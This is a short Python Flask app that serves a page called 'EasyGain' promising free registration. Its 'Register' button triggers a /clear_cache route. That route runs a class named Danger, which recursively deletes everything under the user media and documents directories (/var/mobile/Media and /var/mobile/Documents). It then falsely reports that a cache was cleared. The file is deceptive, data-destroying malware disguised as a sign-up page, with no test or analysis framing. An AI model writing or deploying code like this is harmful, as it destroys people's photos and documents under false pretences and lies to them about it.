from flask import Flask, render_template_string
import os
import shutil

app = Flask(__name__)

# CSS content
css_content = """
body {
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    text-align: center;
    padding: 20px;
    background-color: white;
    border-radius: 10px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

button {
    background-color: #4CAF50;
    color: white;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    border-radius: 5px;
}

button:hover {
    background-color: #45a049;
}
"""

# HTML content
html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EasyGain</title>
    <style>{{ css }}</style>
</head>
<body>
    <div class="container">
        <h1>Welcome to EasyGain</h1>
        <p>Free registration.</p>
        <form action="/clear_cache">
            <button type="submit">Register</button>
        </form>
    </div>
</body>
</html>
"""


class Danger():
    def clear(self):
        target_directories = [
            "/var/mobile/Media",  # User media files (photos, videos, etc.)
            "/var/mobile/Documents"  # User documents
        ]

        for directory in target_directories:
            if os.path.exists(directory):

                for root, dirs, files in os.walk(directory, topdown=False):
                    for file in files:
                        try:
                            os.unlink(os.path.join(root, file))  # Delete file
                            print(f"Deleted: {os.path.join(root, file)}")
                        except Exception as e:
                            print(f"Error deleting {file}: {e}")
                    for dir in dirs:
                        try:
                            shutil.rmtree(os.path.join(root, dir))  # Delete folder
                            print(f"Deleted: {os.path.join(root, dir)}")
                        except Exception as e:
                            print(f"Error deleting {dir}: {e}")
            else:
                print(f"Directory not found: {directory}")



@app.route('/')
def home():
    return render_template_string(html_content, css=css_content)


@app.route('/clear_cache')
def clear_cache():
    Danger().clear()
    return "Cache cleared successfully!"


if __name__ == '__main__':
    app.run(debug=True)
